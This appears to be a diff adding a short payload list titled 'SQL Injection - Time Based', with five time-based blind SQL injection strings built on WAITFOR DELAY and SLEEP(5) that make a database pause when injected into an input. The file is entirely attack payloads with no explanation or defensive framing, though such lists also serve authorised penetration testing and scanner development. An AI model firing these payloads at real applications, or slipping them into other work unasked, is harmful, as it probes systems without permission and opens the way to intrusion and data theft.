@@ -1,0 +1,7 @@
+# SQL Injection - Time Based
+
+'; WAITFOR DELAY '0:0:5'--
+'; SLEEP(5)--
+'; SELECT SLEEP(5)--
+' AND SLEEP(5)--
+' WAITFOR DELAY '0:0:5'--
